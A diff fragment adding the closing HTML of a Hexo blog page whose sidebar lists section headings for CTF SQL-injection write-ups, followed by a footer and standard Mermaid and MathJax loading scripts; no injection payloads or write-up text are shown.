+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#NewStarCTF-2023-%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93-ez-sql"><span class="nav-number">1.</span> <span class="nav-text">[NewStarCTF 2023 公开赛道]ez_sql</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%88%A4%E6%96%AD%E9%97%AD%E5%90%88%E6%96%B9%E5%BC%8F%E4%B8%BA-%E2%80%99%EF%BC%88%E5%8D%95%E5%BC%95%E5%8F%B7%EF%BC%89"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">判断闭合方式为 ’（单引号）</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%88%86%E5%AD%97%E6%AE%B5%E6%95%B0%EF%BC%8C%E4%BB%A5%E6%88%90%E5%8A%9F%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">爆字段数，以成功联合注入</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E7%88%86%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">联合注入爆数据库名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E9%A1%BA%E8%97%A4%E6%91%B8%E7%93%9C%EF%BC%8C%E6%89%BE%E5%88%B0%E8%A1%A8%E5%90%8D"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">顺藤摸瓜，找到表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%8D%E6%89%BE%E5%88%B0%E5%AD%97%E6%AE%B5%E5%90%8D"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">再找到字段名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%9F%A5%E8%AF%A2%E5%AD%97%E6%AE%B5%E5%80%BC"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">查询字段值</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BUU-SQL-COURSE-1"><span class="nav-number">2.</span> <span class="nav-text">BUU SQL COURSE 1</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%89%BE%E5%88%B0%E6%B3%A8%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="nav-number">2.0.0.1.</span> <span class="nav-text">找到注入位置</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E6%B3%A8%E5%85%A5%EF%BC%88%E5%85%AC%E5%BC%8F%E5%8C%96%EF%BC%89"><span class="nav-number">2.0.0.2.</span> <span class="nav-text">开始注入（公式化）</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF-BugKu-sqli-0x1"><span class="nav-number">3.</span> <span class="nav-text">CTF-BugKu-sqli-0x1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF-BugKu-login1"><span class="nav-number">4.</span> <span class="nav-text">CTF-BugKu-login1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2024-%E7%A7%8B%E5%AD%A3%E6%96%B0%E7%94%9F%E8%B5%9B-ez-sql"><span class="nav-number">5.</span> <span class="nav-text">[SWPUCTF 2024 秋季新生赛]ez_sql</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Pocon</p>
+  <div class="site-description" itemprop="description">Pocon's personal blog about Computer Vision, CTF, Multimedia Forensics, Web Security, Pwn and Machine Learning.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">45</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Pocon</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+    
+  <script src="/lib/anime.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+    
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+<script>
+const mermaidBlocks = document.querySelectorAll('pre.mermaid');
+if (mermaidBlocks.length) {
+  mermaidBlocks.forEach(block => {
+    block.querySelectorAll('.post-code-copy').forEach(button => button.remove());
+  });
+
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@11.15.0/dist/mermaid.min.js', () => {
+    mermaid.initialize({
+      startOnLoad: false,
+      theme    : 'forest',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    });
+    if (mermaid.run) {
+      mermaid.run({ querySelector: 'pre.mermaid' });
+    } else {
+      mermaid.init(undefined, mermaidBlocks);
+    }
+  }, window.mermaid);
+}
+</script>
+
+
+  
+  
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
+
+  
+
+</body>
+</html>
